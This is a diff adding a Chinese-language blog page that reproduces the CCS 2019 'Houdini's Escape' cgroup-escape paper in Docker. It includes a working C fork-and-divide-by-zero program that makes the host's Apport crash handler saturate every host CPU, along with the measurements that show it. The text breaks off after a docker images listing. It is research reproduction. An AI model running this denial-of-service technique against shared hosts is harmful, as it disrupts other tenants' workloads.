@@ -1,0 +1,1210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"tianyuzhou.top","root":"/","scheme":"Gemini","version":"7.7.2","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="a recurrent of the cgroup escaping paper">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cgroup - Houdini&#39;s escape">
+<meta property="og:url" content="https://tianyuzhou.top/2019/10/18/cgroups-escape/index.html">
+<meta property="og:site_name" content="SteinsGate">
+<meta property="og:description" content="a recurrent of the cgroup escaping paper">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-10-18T14:12:12.000Z">
+<meta property="article:modified_time" content="2023-02-20T10:03:56.473Z">
+<meta property="article:author" content="Tianyu Zhou">
+<meta property="article:tag" content="cgroup">
+<meta property="article:tag" content="Docker">
+<meta property="article:tag" content="Linux container">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://tianyuzhou.top/2019/10/18/cgroups-escape/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>cgroup - Houdini's escape | SteinsGate</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">SteinsGate</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">enjoy coding</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="fa fa-fw fa-book"></i>Resources</a>
+
+  </li>
+        <li class="menu-item menu-item-conference">
+
+    <a href="/conference/" rel="section"><i class="fa fa-fw fa-smile-o"></i>Conference</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RpYW55dXpob3U5NQ==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://tianyuzhou.top/2019/10/18/cgroups-escape/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Tianyu Zhou">
+      <meta itemprop="description" content="a personal site of Tianyu">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SteinsGate">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          cgroup - Houdini's escape
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-10-18 22:12:12" itemprop="dateCreated datePublished" datetime="2019-10-18T22:12:12+08:00">2019-10-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-02-20 18:03:56" itemprop="dateModified" datetime="2023-02-20T18:03:56+08:00">2023-02-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux-Kernel/" itemprop="url" rel="index"><span itemprop="name">Linux Kernel</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">a recurrent of the cgroup escaping paper</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Linux Control Group，也称为 cgroups，是用于监控、限制 process 资源的一种 Linux kernel feature[^note1]。它同时也时操作系统级别容器化的重要组成模块。它将进程划分到多个分层的组，同时为这些组提供资源控制器，从而管理 CPU，内存还有块设备的输入输出。当创建子进程的时候，该子进程会自动从他的创建者那里拷贝 cgroup 属性，从而强制实行资源控制。然而，在创建进程的时候从父进程继承 cgroup 约束并不是万无一失的，有时候一致性和资源合理分配并不能很好的保持。</p>
+<p>本文介绍的就是一种 cgroup escaping 的方法，被作者称之为 Houdini’s Escape，<span class="exturl" data-url="aHR0cHM6Ly9nenM3MTUuZ2l0aHViLmlvL3B1YnMvSE9VRElOSV9DQ1MxOS5wZGY=" title="https://gzs715.github.io/pubs/HOUDINI_CCS19.pdf">这篇论文<i class="fa fa-external-link"></i></span>[^note2] 被 <span class="exturl" data-url="aHR0cHM6Ly93d3cuc2lnc2FjLm9yZy9jY3MvQ0NTMjAxOS8=" title="https://www.sigsac.org/ccs/CCS2019/">CCS 2019<i class="fa fa-external-link"></i></span> 会议[^note3] 录用。</p>
+<a id="more"></a>
+
+<p>论文主要针对之前提到的子进程 cgroup 进行攻击，使得该子进程脱离父进程的 cgroup 类别，从而进行 ou-of-band 攻击，使得同一物理机上的其他 container 的运行受到影响，同时还可以获得更多的资源（超出它本应该获得的范围）。我撰写该 blog 的目的是在于复现该论文的 esacape 方法，同时总结这些方法的特性和推广的价值。</p>
+<h2 id="Cgroups-Hierarchy-and-Controllers"><a href="#Cgroups-Hierarchy-and-Controllers" class="headerlink" title="Cgroups Hierarchy and Controllers"></a>Cgroups Hierarchy and Controllers</h2><blockquote>
+<p>In Linux, cgroups are organized in a hierarchical structure where a set of cgroups are arranged in a tree. Each task (e.g., a thread) can only be associated with exactly one cgroup in one hierarchy, but can be a member of multiple cgroups in different hierarchies. Each hierarchy then has one or more subsystems attached to it, so that a resource controller can apply per-cgroup limits on specific system resources. With the hierarchical structure, the cgroups mechanism is able to limit the total amount of resources for a group of processes(e.g., a container).</p>
+</blockquote>
+<p>上述是关于 cgroup 的架构介绍，重要的有以下几点</p>
+<ul>
+<li>一个 cgroup 对应有一种 hierarchy</li>
+<li>一个 task 在同类 hierarchy 中只能对应一个 cgroup</li>
+<li>一个 task 可以有多个 cgroups</li>
+<li>resource controller 按照 cgroup 来进行具体资源的管控</li>
+</ul>
+<p>Cgroup 相关的 resource controller 一共有四种</p>
+<ul>
+<li><strong>cpu controller</strong>：在多个 cgroup 竞争 cpu 资源的时候，按照 cpu share 的值来按比例分配 cpu 资源，也可以通过设定 <em>quota</em> 和 <em>period</em> 来限制在固定周期内的 cpu 使用量</li>
+<li><strong>cpusets controller</strong>：将 task 限制在具体的 cpu core 和 memory node 上</li>
+<li><strong>blkio controller</strong>：控制和限制对于块设备的访问，可以通过设定 <em>blkio.weight</em> 来划分占用比例，也可以通过设置具体的上限</li>
+<li><strong>pid controller</strong>：为 container 设置 task number 上限，上限存放在 <em>pids.max</em> 中，当前的 task 数目统计放在 <em>pids.current</em> 中，一旦达到上线，所有的 fork 和 clone 操作都会被禁止</li>
+</ul>
+<h2 id="Cgroups-Inheritance"><a href="#Cgroups-Inheritance" class="headerlink" title="Cgroups Inheritance"></a>Cgroups Inheritance</h2><blockquote>
+<p>One important feature of cgroups is that child processes inherit cgroups attributes from their parent processes. </p>
+</blockquote>
+<p>子进程被创建时，会调用 fork() 或是 clone() 函数，一开始新创建的进程会 attach 到 root cgroup 上，在完成寄存器还有其他的进程环境拷贝之后，将会调用 cgroup 拷贝函数，将这个新创建的进程 attach 到创建它的父进程所属的 cgroups。</p>
+<blockquote>
+<p>Particularly, the function attaches the task to its parent cgroups by recursively going through all cgroup subsystems. As a result, after the copying procedure, the child task inherits memberships to the exact same cgroups as its parent task.</p>
+</blockquote>
+<p>这个 cgroup 拷贝函数会把所有 cgroup subsystem 递归遍历一遍，最终实现将子进程的 cgroup 设置为和父进程完全一致。</p>
+<p>举例来说，如果 cpusets 资源控制器将父进程指定为 2 号 cpu core，那么创建的子进程也会被指定为只能在 2 号 cpu core 上面运行。同时，如果 cpu 资源控制器对父进程设置了 <em>quota</em> 和 <em>period</em>，那么新创建的子进程将会和父进程共享这些资源，即子进程和父进程的 cpu 使用量加起来不能超过 <em>quota</em>。</p>
+<h2 id="Exploiting-Strategies"><a href="#Exploiting-Strategies" class="headerlink" title="Exploiting Strategies"></a>Exploiting Strategies</h2><h2 id="Cases-Reccurent"><a href="#Cases-Reccurent" class="headerlink" title="Cases Reccurent"></a>Cases Reccurent</h2><blockquote>
+<p>We use the Docker container to set the configuration of cgroups through the provided interfaces. Besides, Docker also ensures that containers are isolated through namespaces bydefault. </p>
+<p>Especially, with the USER namespace enabled, the root user in a container is mapped to a non-privileged user on the host. Thus, the privileged operations within containers cannot affect the host kernel. Our case studies are conducted in such de-privileged containers.</p>
+</blockquote>
+<h3 id="Case-1-Exception-Handling"><a href="#Case-1-Exception-Handling" class="headerlink" title="Case 1: Exception Handling"></a>Case 1: Exception Handling</h3><p><strong>constrains</strong></p>
+<ul>
+<li>cpu core: 1</li>
+<li>cpu share: 100%, 10%, 5%</li>
+<li>pid limitation: None, 100, 50</li>
+</ul>
+<p><strong>method</strong></p>
+<p>首先确保安装了 docker[^note4] 并且下载了 ubuntu 镜像。若没有下载，在第一次运行该镜像时会自动下载。</p>
+<p>接下来明确 docker run 的参数以及观察 cpu 使用情况时用到的工具。</p>
+<p>docker run 语句如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run --cpuset-cpus=<span class="string">"0"</span> --cpus=0.1 --pids-limit=50 -v /home/zty/dev/cfile:/tmp/cfile --rm -it ubuntu</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这里没有像论文里说的那样用 user namespace 来实现非 root，考虑后续实现</li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL3NlY3VyaXR5L3VzZXJucy1yZW1hcC8=" title="https://docs.docker.com/engine/security/userns-remap/">https://docs.docker.com/engine/security/userns-remap/<i class="fa fa-external-link"></i></span>  参考这个</li>
+</ul>
+<p>讲解一下基本的参数，更多的参数说明请参考官方文档[^note5]</p>
+<ul>
+<li><em>--cpuset-cpus</em> 指定了 container 运行在哪个 cpu core 上，可以指定单个或者多个</li>
+<li><em>--cpus</em> 指定了 container 可以使用 cpu 资源的上限，举例来说，上述语句里面的值为 0.1，那么 container 可以使用的 cpu 资源上限就是 10%，也可以用 <em>--cpu-period</em> 和 <em>--cpu-quota</em> 捆绑使用来<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL3JlZmVyZW5jZS9ydW4vI2NwdS1wZXJpb2QtY29uc3RyYWludA==" title="https://docs.docker.com/engine/reference/run/#cpu-period-constraint">实现相同的功能<i class="fa fa-external-link"></i></span>[^note6]</li>
+<li><em>--pids-limit</em> 指定了进程数目的上线，一旦超过这个上限，就会返回 <em>fork: Interrupted system call</em> 的错误信息</li>
+<li>剩下的 <em>-v</em> 是文件映射，为了执行在 Host 上编译生成的文件</li>
+</ul>
+<p>接下来需要做的是编写 exploit code，用来制造 faults 从而实现 escape from parrent cgroup。</p>
+<p>编写的文件如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt; </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> i = <span class="number">1</span> / <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ignore the SIGCHLD signal</span></span><br><span class="line">        signal(SIGCHLD,SIG_IGN);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>逻辑很简单，父进程在不停的循环执行 fork 操作，而成功生成的子进程则负责执行 <em>div 0</em> 操作引发 faults。其中 ignore <code>SIGCHLD</code>信号的原因参考<a href="https://tianyuzhou.top/2019/10/21/fork-in-c/">这篇文章</a>。具体产生的 fault 如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Floating point exception(core dumped)</span><br></pre></td></tr></table></figure>
+
+<p>将该文件编译好之后，可以尝试运行，但由于会不断的制造 fault，造成 Host 的 cpu 直接被占满，我在实验的时候根本就无法进行后续操作了，只能重启电脑。</p>
+<p>按照论文里面的说法，对于 Ubuntu 而言，处理这些 faults 的应用是 <em>Apport</em>，因此在我们执行这个程序的时候，Apport 进程将会大量产生，从而占满 cpu。</p>
+<p>下面的是运行 top 命令对于该文件运行时的监控</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">top - 16:46:18 up  2:02,  1 user,  load average: 15.93, 4.08, 1.68</span><br><span class="line">Tasks: 470 total,  55 running, 319 sleeping,   0 stopped,   1 zombie</span><br><span class="line">%Cpu0  : 84.7 us, 15.3 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu1  : 93.2 us,  6.8 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu2  : 94.1 us,  5.9 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu3  : 92.2 us,  7.8 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu4  : 91.5 us,  8.5 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu5  : 89.9 us, 10.1 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu6  : 92.5 us,  7.5 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu7  : 91.2 us,  8.8 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu8  : 91.9 us,  8.1 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu9  : 92.2 us,  7.8 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu10 : 91.9 us,  8.1 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu11 : 91.6 us,  8.4 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">KiB Mem : 16212396 total, 10905352 free,  3395860 used,  1911184 buff&#x2F;cache</span><br><span class="line">KiB Swap:  2097148 total,  2097148 free,        0 used. 12426024 avail Mem </span><br><span class="line"></span><br><span class="line">  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND</span><br><span class="line"> 7647 root      20   0    4372   1080   1008 R   8.9  0.0   0:01.63 pppp</span><br><span class="line">26842 root      20   0   98756  24208  11808 R   4.3  0.1   0:00.13 apport</span><br><span class="line">26847 root      20   0   98236  23900  11752 R   3.9  0.1   0:00.12 apport</span><br><span class="line">26852 root      20   0   98236  23004  11356 R   3.9  0.1   0:00.12 apport</span><br><span class="line">27400 root      20   0   98756  24316  11916 R   3.9  0.1   0:00.12 apport</span><br><span class="line">27403 root      20   0   98236  23268  11396 R   3.9  0.1   0:00.12 apport</span><br><span class="line">... lots of apport</span><br></pre></td></tr></table></figure>
+
+<p>运行 top 命令之后按下数字键盘中的 1，可以分不同的 core 来展示 cpu 的使用量，上图是运行的一个截图，并不是稳定的值，只是 cpu 被无数个 apport 占满时的一个时刻的情况</p>
+<p>而此刻，我也用 <em>docker stats</em> 命令监视着容器的情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NAME            CPU %       MEM USAGE &#x2F; LIMIT     MEM %         PIDS</span><br><span class="line">nifty_gauss     10.66%      10.5MiB &#x2F; 15.46GiB    0.07%         50</span><br></pre></td></tr></table></figure>
+
+<p>为了方便展示，我把 container ID，Net I/O，Block I/O 这些字段删除了，重点关注容器的 cpu 占用，我们发现短时间内 cpu 使用率为 10.66%，在持续观察的过程中，基本都在 10% 上下，也符合之前设定的 10% 以内，因此在这种情况下，其实是 Apport 这个 core dump application 占用了大量的 CPU。</p>
+<h4 id="Graph-for-cpu-utilization"><a href="#Graph-for-cpu-utilization" class="headerlink" title="Graph for cpu utilization"></a>Graph for cpu utilization</h4><div id="container" style="weight:80%; height: 600px"></div>
+<script type="text/javascript" src="/js/echarts.min.js"></script>
+<script type="text/javascript">
+var dom = document.getElementById("container");
+var myChart = echarts.init(dom);
+var app = {};
+option = null;
+var seriesLabel = {
+normal: {
+show: true,
+position: 'right',
+textBorderWidth: 2
+}
+}
+option = {
+tooltip: {
+trigger: 'axis',
+axisPointer: {
+type: 'shadow'
+}
+},
+legend: {
+data: ['Container', 'Host(100% container)', 'Host(10% container)', 'Host(5% container)']
+},
+xAxis: {
+type: 'value',
+name: '%',
+axisLabel: {
+formatter: '{value}'
+}
+},
+yAxis: {
+type: 'category',
+name: 'PID limit',
+nameLocation: 'start',
+inverse: true,
+data: ['none', '100', '50'],
+axisLabel: {
+formatter: function (value) {
+return value;
+},
+margin: 20,
+rich: {
+value: {
+lineHeight: 30,
+align: 'center'
+}
+}
+}
+},
+series: [
+{
+name: 'Container',
+type: 'bar',
+data: [7.14, 11.5, 15],
+label: seriesLabel
+},
+{
+name: 'Host(100% container)',
+type: 'bar',
+label: seriesLabel,
+data: [1200, 1200, 1200]
+},
+{
+name: 'Container(10%)',
+type: 'bar',
+data: [2.56, 10.09, 10.38],
+label: seriesLabel,
+itemStyle: {
+color: '#c23531'
+}
+},
+{
+name: 'Host(10% container)',
+type: 'bar',
+label: seriesLabel,
+data: [1200, 1200, 1200]
+},
+{
+name: 'Container(5%)',
+type: 'bar',
+data: [3.04, 5.35, 5.13],
+label: seriesLabel,
+itemStyle: {
+color: '#c23531'
+}
+},
+{
+name: 'Host(5% container)',
+type: 'bar',
+label: seriesLabel,
+data: [1200, 1200, 1200]
+}
+]
+};
+;
+if (option && typeof option === "object") {
+    myChart.setOption(option, true);
+}
+</script>
+
+
+
+<p>在上图中，只要在 container 中 run 我们之前编写的 exploit 程序，Host Utilization 即物理主机 cpu 使用量就会达到 1200%，因为物理机一共有 12 个 cpu core。可以看到在每个 pid limit 小组当中，container 的 cpu 使用量都是随着 cpu share 的限制逐步降低的，但有部分内容与论文当中展示的数据图表不同，主要有以下几点</p>
+<ul>
+<li><strong>所有的 Host Utilization 均为 1200%</strong>，不存在有 cpu 未被占满的情况</li>
+<li>由上一点可以看出，<strong>限制 container 的 cpu share 并不能缓解 host cpu 滥用这一情况</strong></li>
+<li>随着 PID limit 的变化，container utilization 并没有大幅度的变化，事实上，因为在不限制 PID limit 的时候可以在短时间内创建大量的 core dump，因此 container utilization 还比其他的情况要低一些</li>
+</ul>
+<h4 id="DoS-Attack"><a href="#DoS-Attack" class="headerlink" title="DoS Attack"></a>DoS Attack</h4><p>由于 sysbench 需要在容器当中使用，所以可以创建一个新的 image 然后保存它，之后每次都可以用这个 image 来实验，因为 sysbench 要用好几次。</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu</span><br><span class="line"><span class="keyword">MAINTAINER</span> Tianyu &lt;lufeihaizei2008@gmail.com&gt;</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./apt /apt-info</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> cp /apt-info/sources.list /etc/apt/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yes | apt-get install sysbench</span></span><br></pre></td></tr></table></figure>
+
+<p>利用上述的文件创建新的 image，然后利用新的 image 创建 victim container。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tianyu-ubuntu&#x2F;</span><br><span class="line">├── apt</span><br><span class="line">│   └── sources.list</span><br><span class="line">└── Dockerfile</span><br></pre></td></tr></table></figure>
+
+<p>树型文件目录如上图所示，其中 apt 文件夹和 sources.list 文件是用来更新 apt-get 源，因为在国内需要用<span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLnpqdS5lZHUuY24v" title="https://mirrors.zju.edu.cn/">国内的镜像<i class="fa fa-external-link"></i></span>。具体的 Dockerfile instruction 介绍请参考<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL3JlZmVyZW5jZS9idWlsZGVyLw==" title="https://docs.docker.com/engine/reference/builder/">官方文档<i class="fa fa-external-link"></i></span>。</p>
+<p>然后在 <code>cgroup-escape/</code> 目录运行以下命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker build -t tianyu/ubuntu:v1 .</span></span><br></pre></td></tr></table></figure>
+
+<p>然后就可以在 docker images 当中看到我们新建的 image 了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker images</span></span><br><span class="line">REPOSITORY         TAG     IMAGE ID          CREATED             SIZE</span><br><span class="line">tianyu/ubuntu      v1      ab7bed523666      7 seconds ago       131MB</span><br></pre></td></tr></table></figure>
+
